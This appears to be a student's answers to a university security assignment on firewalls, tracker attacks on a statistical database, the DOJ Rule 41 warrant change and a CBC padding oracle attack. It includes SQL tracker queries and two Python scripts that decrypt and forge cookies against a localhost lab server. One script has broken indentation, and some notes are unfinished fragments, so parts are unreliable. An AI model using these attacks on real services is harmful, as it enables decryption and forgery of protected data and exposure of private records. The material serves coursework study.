Title         : CS458 Assignment 3
Author        : Yifan Yang  
Affiliation   : University of waterloo  
Email         : y369yang@uwaterloo  


Doc class     : [7pt]article


[TITLE]



# Question 1     { #sec-intro }

## 
Figure as below
~ Figure { #distributed system; caption:"distributed movie web design "; page-align:here }
![webdesign]
~
[webdesign]: images/webdesign.png "webdesign" { width:auto; max-width:120% }



## 
I will put on the centralized authentication server. As indicated by **FW1** Since we only have one firewall so we have to put it 
into some place that can protect all the internet connection in some way. Since all the customer connection, wherever they are and connect to which 
distributed server, they have to go to visit centralized server for identity authentication. So with a limit budget, we can at least put a 
a firewall on authentication server and protect the authentication level which is mandatory to every user.  For firewall, **I will choose proxy** since it is not as transparent as packet filtering or stateful
inspection, which means it has stronger and more customizable features. And it can also limit types of allowed database queries, which essential for User info database we want to protect here

## 
Besides **FW1** talked in part2, I will also add a firewall between webserver and dataserver at each distributed system, as indicated by **FW2** in figure 1.
Since we have budget now, we also want to protect our movie data. from part2, by setting up a firewall at the centrailzed authentication server, we can protect our authenticationn process and assure the users logged in 
are "real users"" that have signed up for our services. However, after authentication processs, a "real user" can still do some inappoparite things. For example, they can 
access the data and download the movie somehow even we only allow them watch online. Thus only with F1, our data is still not safe enough. We need add another layer of
protection for our data, which is **FW2**. **I will choose Packet filtering gateways** since we only need to check the head of packet to find out where a particular transfer request come from and go: if users 
if users want a data packet to go to webserver they login so they can watch online, we allow;  however, if they want data to go to their local machine, we prohibit.




# Question 2

## 
**Assumption:** players among PVE and PVP servers are almost evenly distributed. so
```
  SELECT * FROM Players where Server = PVE
  SELECT * FROM Players where Server = PVP
```
will fall between $k$ to $N-k$ since  $\frac{1}{8} < \frac{1}{2} < 1-\frac{1}{8}$


**Tracker:** 
``` 
  SELECT SUM(Gold) FROM Players where Server = PVE
```

**Three queries:**
``` 
  q( C or T )    = SELECT SUM(Gold) FROM Players 
  where Server = "PVE" or Username = "XdarksephirothX"
  q( C or not T) = SELECT SUM(Gold) FROM Players 
  where Server = "PVP" or Username = "XdarksephirothX"
  q( S )         = SELECT SUM(Gold) FROM Players
  XdarksephirothX's gold =  q( C or T ) +q( C or not T) - q( S ) 
```

## 
tracker and assumption: same as 2.1

**Three queries:**
``` 
 q( C or T )    = SELECT COUNT(*) FROM Players where 
 (Server=PVE or Username=doomlaser) and Gold>10 billion
 q( C or not T) = SELECT COUNT(*) FROM Players where 
 (Server=PVP or Username=doomlaser) and Gold>10 billion
 q( S )         = SELECT COUNT(*) FROM Players where Gold > 10 billion
```
so by doing  $q( C or T ) +q( C or not T) - q( S )$  we actually only query for doomlaser and ask "whether doomlaser's gold is more than 10 billion or not?"
if result is 1 then means yes, if 0 then means no. So we just need to take 20 billion/2 as midddle point and query $\log_2 20$billion times to apply binary search in order to find result. 

# Question 3
## 

1. he problem with current rules, DOJ says, is that judges can only issue warrants to search property in their districts,
 or in crimes that involve their districts.
When a computer or device involved in a crime is from an unknown or concealed location, 
investigators should be able to get a warrant to remotely search the devices from any magistrate judge in the country, the rule change says.

2. This amendment ensures that courts can be asked to review warrant applications in situations where is 
it currently unclear what judge has that authority. 

3. Regarding botnets, DOJ says it needs the change to be able to effectively bring down the malicious networks without having to go to judges all over the country in a time-consuming process.



## 

p2p mask ip
proxy to hide ip address and identity
 In other words, if you can’t delete all you online info, you can create several identities and create as much confusion as possible surrounding who you really are.

## 
cloud service, encryption, computer security

## 
- Wyden is concerned about going after unnumbered computers with one warrant. 
In cases involving so-called botnets -- networks of computers secretly running 
malicious software without their owners' knowledge -- the FBI could be remotely 
accessing scores or hundreds of victims' computers, Wyden says.
If the amendment finally gives the permission for searching outside the country, Canada may be affected.

When you're letting the government to get a single warrant to hack into an unnumbered amount of computers across 
immeasurable districts, you're not talking about a 


FBI last summer about federal law enforcement's use of spyware, software that can be surreptitiously installed on Americans' 
devices to track their activity, in the context of the FBI seeking the changes to Rule 41 to let spyware be deployed more easily.

## 

Judge shopping is the practice of filing numerous lawsuits that assert the same claim in hopes of having one of the lawsuits heard by a favorable judge.
Sometimes attorneys attempt to "judge shop" by claiming that is related to a previous case and therefore should be tried by the same judge.



 federal officials shopping for favorable judges to grant their warrants, about judges not fully understanding the 
 implications of warrants, and about U.S. law enforcement unknowingly accessing computers abroad outside of their jurisdiction.



Defense attorneys in the Freddie Gray case accused prosecutors of judge shopping to get warrants approved to search the defendants' phones.
The attorneys allege that according to a memo released by prosecutors, that prosecutors shopped around for a judge that would sign a search warrant to obtain the officer’s cell
 phone records after a Baltimore judge refused to issue a warrant on the first go round.




# Question 4
## 

- **average case** =   bytes in block $*$ number of block(N)$*$ different combination per byte /2 
                   = 256$*$16/2$*$N=2048N

- **worst case** =   bytes in block $*$ number of block(N)$*$ different combination per byte 
= 256$*$16$*$N=4096N

## 
 - use **Message Authentication Codes**.
 - **reason:**after server generate the encrypted text, it applys MAC algo to get the key hash this encrypted key again. Attack by padding in CBC mode need the encrypted text to XOR with intermediate string to decrypt,
 Now attacker cannot get orginnal encryptyed text since it has been hashed again so they cannot do padding even if they know padding information and get server respond. Also server can use the key to check the correctness of the cookie, 
 to make sure it's not modified
 
 - **Integrity** since server can use the key to check the correctness of the cookie, to make sure it's not modified. **Authenticity** since user can use the key to check the authenticity of the cookie, like whether this cookie is really sent by this server 


## 

- **3.1 line 5b **  change to : 
```
if O(r|y) = 0 then stop and output(rb−n+1⊕n-1)(rb−(n-1)+1⊕n-2)...(rb-1⊕1)(rb⊕n)
```
- **3.2 line 1 **  change to : 
```
rk= ak ⊕ (b-k)   for k = j.....b-1
rk= b-j+2        for k = b
```
- **3.2 line 5 **  change to : 
```
output rj-1 ⊕ i ⊕ (b-j+1)
```


## 
```python
    #!/usr/bin/env python
  import urllib
  import urllib2
  import base64
  import sys
  
  SIZE_OF_BLOCK=16       # AES is 128 bits = 16 bytes
  
  # check whether a particular hit may be match multiple padding
  def check(byte,IVguess,blk):
    inidicator = -1
    for x in range(0, 15):
      old = IVguess[x]
      IVguess[x] = IVguess[x] ^ 1
      header = {"Cookie" : 'user="' + 
      (base64.b64encode(''.join(map(chr,IVguess)) + blk)) + '"'}
      my_request = urllib2.Request("http://localhost:4555", None, header)
      try:
        my_response = urllib2.urlopen(my_request)
      except urllib2.HTTPError as e:
        IVguess[x] = old
        inidicator = x
        return inidicator
      else:
        IVguess[x] = old
    return inidicator
  
  # send request to server 
  def send_padding_request(byte,IVguess,blk):
    #print ('ddd')
    for x in range(0, 256): 
      IVguess[byte] = x
      header = {"Cookie" : 'user="' +
      (base64.b64encode(''.join(map(chr,IVguess)) + blk)) + '"'}
      my_request = urllib2.Request("http://localhost:4555", None, header)
      try:
        my_response = urllib2.urlopen(my_request)
      except urllib2.HTTPError as e:
        pass
      else:
        break
  
  def decrypt(Cookie):
      # decode first,  if not fit length, terminate
      try:
        cookie_block = base64.standard_b64decode(Cookie)
      except TypeError:
        print("sorry, length is not in requirement, terminate")
        return
      else:
        # divide to chunks
        cookie_block = list((cookie_block[0+k : SIZE_OF_BLOCK+k] 
        for k in range(0, len(cookie_block), SIZE_OF_BLOCK)))
        previous_real_IV = cookie_block[0]
  
        plaintexts = ''
        counter=0
        
        # for each block
        for block in cookie_block[1:]:
        #setup
            IVguess = [0]*SIZE_OF_BLOCK
            intermediate_state = [0]*SIZE_OF_BLOCK
            plaintext = [0]*SIZE_OF_BLOCK
            previous_real_IV = map (ord,cookie_block[counter])
            counter = counter +  1
  
            for byte in range(SIZE_OF_BLOCK-1, -1, -1):
  
                padding = [0] * SIZE_OF_BLOCK
                # send request 
                send_padding_request(byte,IVguess,block)
  
                # once we break we have a working byte
                padding_num = (SIZE_OF_BLOCK-1) - (byte - 1)
  
                # caculate intermedinate byte
                if padding_num == 1:
            inidicator = check(byte,IVguess,block)
            if inidicator != -1:
              intermediate_state[byte] = IVguess[byte] ^ (SIZE_OF_BLOCK - inidicator)
            else:
              intermediate_state[byte] = IVguess[byte] ^ 1
                else:
                    intermediate_state[byte] = IVguess[byte] ^ (padding_num - 1)
  
                # calulate plain text
                plaintext[byte] = intermediate_state[byte]^previous_real_IV[byte] 
  
                # get padding so we can adjust IVguess for next byte decryption
                for x in range (byte, SIZE_OF_BLOCK):  # 14: 14 15
                    if x == SIZE_OF_BLOCK-1:  # 15
                        padding[x] = padding_num+1  # 2
                    else: 
                        padding[x] = 15 - x 
  
                # adjust IVguess
                for k in range (byte, SIZE_OF_BLOCK):
                    IVguess[k] = intermediate_state[k] ^ padding[k]
  
            plaintexts= plaintexts + (''.join(map(chr,plaintext)))
  
        print(plaintexts)
  
  
  def start():
      if len(sys.argv) != 2:
          print('Usage: ./encrypt <Cookie String>')
          sys.exit(1)
      text = sys.argv[1]
      decrypt(text)
  
  if __name__ == "__main__":
      start()

  
  
  
```



## 
```python
  #!/usr/bin/env python
import urllib
import urllib2
import base64
import sys

SIZE_OF_BLOCK=16    

# send request to server 
def send_padding_request(byte,IVguess,blk):
    for x in range(0, 256):
        IVguess[byte] = x
        header = {"Cookie" : 'user="' + 
        (base64.b64encode(''.join(map(chr,IVguess)) + blk)) + '"'}
        my_request = urllib2.Request("http://localhost:4555", None, header)
        try:
            my_response = urllib2.urlopen(my_request)
        except urllib2.HTTPError as e:
            pass
        else:
            return

def encrypt(Word):

    word_to_use = list((Word[0+k : SIZE_OF_BLOCK+k] 
    for k in range(0, len(Word), SIZE_OF_BLOCK)))

    #fisrt_randomly select a block of encrypt text to initialze encryption
    next_block= '\xf6\x1aJk\x00\xcf\xd1d"\x9d\xa2\x90\x0bi*\x1c'

    encryptedtexts = next_block

    # checking end padding of the last block 
    end_padding=''
    length_of_last=len(word_to_use[-1])
    if (length_of_last != SIZE_OF_BLOCK):
        for x in range(length_of_last, SIZE_OF_BLOCK-1):
            word_to_use[-1] += chr(SIZE_OF_BLOCK- x - 1)
        word_to_use[-1] += chr(SIZE_OF_BLOCK-length_of_last)
    else:
        for x in range(0,SIZE_OF_BLOCK-1):
            end_padding += chr(15-x)
        end_padding += chr(16)
        word_to_use.append(end_padding)
    

    # for each block
    for block in reversed(word_to_use):
        
        IVguess = [0]*SIZE_OF_BLOCK
        intermediate_state = [0]*SIZE_OF_BLOCK
        plaintext = map (ord,block)
        encryptedtext = [0]*SIZE_OF_BLOCK


        for byte in range(SIZE_OF_BLOCK-1, -1, -1):

            padding = [0] * SIZE_OF_BLOCK

            # send request 
            
            send_padding_request(byte,IVguess,next_block)

            # once we break we have a working byte
            padding_num = (SIZE_OF_BLOCK-1) - (byte - 1)

            # calculate intermediate_state byte by byte
            if padding_num == 1:
                intermediate_state[byte] = IVguess[byte] ^ 1
            else:
                intermediate_state[byte] = IVguess[byte] ^ (padding_num - 1)

            # we have plain text and intermediate state so we can calulate plain text
            encryptedtext[byte] = intermediate_state[byte]^plaintext[byte]

            # get padding so we can adjust IVguess for next byte decryption
            for x in range (byte, SIZE_OF_BLOCK):  # 14: 14 15
                if x == SIZE_OF_BLOCK-1:  # 15
                    padding[x] = padding_num+1  # 2
                else: 
                    padding[x] = 15 - x 

            # adjust IVguess
            for k in range (byte, SIZE_OF_BLOCK):
                IVguess[k] = intermediate_state[k] ^ padding[k]

        #updata previous block as newly encrypted block 
        next_block=  (''.join(map(chr,encryptedtext)))
        encryptedtexts =(''.join(map(chr,encryptedtext)))+encryptedtexts

    print(base64.b64encode(encryptedtexts))



def start():
    if len(sys.argv) != 2:
        print('Usage: ./encrypt <Cookie String>')
        sys.exit(1)
    word = sys.argv[1]
    encrypt(word)

if __name__ == "__main__":
    start()

  
  
```



